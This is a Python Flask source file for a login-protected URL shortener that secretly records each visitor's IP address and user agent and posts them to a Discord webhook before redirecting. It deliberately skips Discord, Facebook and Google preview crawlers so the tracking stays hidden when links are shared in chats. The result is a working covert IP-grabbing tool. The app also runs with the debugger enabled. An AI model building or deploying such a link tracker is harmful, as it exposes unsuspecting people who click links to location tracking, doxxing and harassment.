from flask import Flask, request, redirect, session, url_for
import json
import string
import random
import requests
import os
from urllib.parse import quote
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Generate a random secret key

DATA_FILE = 'data.json'
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

# Authentication credentials from environment variables
USERNAME = os.getenv('URL_SHORTENER_USERNAME')
PASSWORD = os.getenv('URL_SHORTENER_PASSWORD')

# User agents to ignore
IGNORED_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) DiscordBots/25.1.4 Chrome/102.0.5005.167 Electron/19.0.17 Safari/537.36",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

# Ensure the data file exists
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({"urls": {}}, f)

# Function to load data from the JSON file
def load_data():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

# Function to save data to the JSON file
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Function to generate a random string
def generate_short_url():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# Function to log IP and user agent to Discord
def log_to_discord(ip, user_agent):
    if user_agent in IGNORED_USER_AGENTS:
        return  # Do not send webhook for ignored user agents
    data = {
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send webhook: {response.status_code}, {response.text}")

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return 'Invalid credentials', 401
    return '''
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    '''

# Logout route
@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Index route with authentication
@app.route('/', methods=['GET', 'POST'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        original_url = request.form['original_url']
        short_path = generate_short_url()
        data = load_data()
        data['urls'][short_path] = original_url
        save_data(data)
        return f"Short URL: {request.host_url}{quote(short_path)}"
    
    return '''
        <form method="post">
            <input type="url" name="original_url" placeholder="Enter URL" required>
            <button type="submit">Shorten</button>
        </form>
        <a href="/logout">Logout</a>
    '''

@app.route('/<short_path>')
def redirect_url(short_path):
    data = load_data()
    if short_path in data['urls']:
        original_url = data['urls'][short_path]
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        log_to_discord(ip, user_agent)
        return redirect(original_url)
    return "URL not found", 404

if __name__ == '__main__':
    app.run(debug=True)
